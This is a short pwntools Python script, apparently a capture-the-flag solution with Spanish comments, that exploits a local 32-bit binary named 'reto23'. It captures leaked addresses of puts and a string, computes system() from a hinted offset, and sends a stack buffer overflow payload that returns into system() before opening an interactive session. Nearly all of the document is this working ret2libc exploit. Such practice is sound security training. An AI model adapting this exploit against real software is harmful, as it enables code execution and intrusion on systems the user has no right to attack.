#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /home/luciano/Descargas/reto23
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/home/luciano/Descargas/reto23')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

io = start()

output = io.recvuntil(b"puts: ")
puts_address = io.recvline().strip()  # Captura la dirección de puts
print(puts_address)

# Convierte la dirección en un entero
puts_address_int = int(puts_address.decode(), 16)

#Segun la pista del CTF system esta a -149504 de distancia de puts
system_address_int = puts_address_int - 149504

output = io.recvuntil(b"string_util: ")
string_address = io.recvline().strip()  # Captura la dirección de string_utils
print(string_address)

string_address_int =int(string_address.decode(), 16)

output = io.recvuntil(b"Ingrese su input:")
# Ahora yo tengo que lograr enviar la direccion de system en la dirección de retorno, y la del string como parametro de esta
payload = b"A"*160+p32(system_address_int)+b"B"*4+p32(string_address_int)+b"\n"
io.send(payload)

io.interactive()

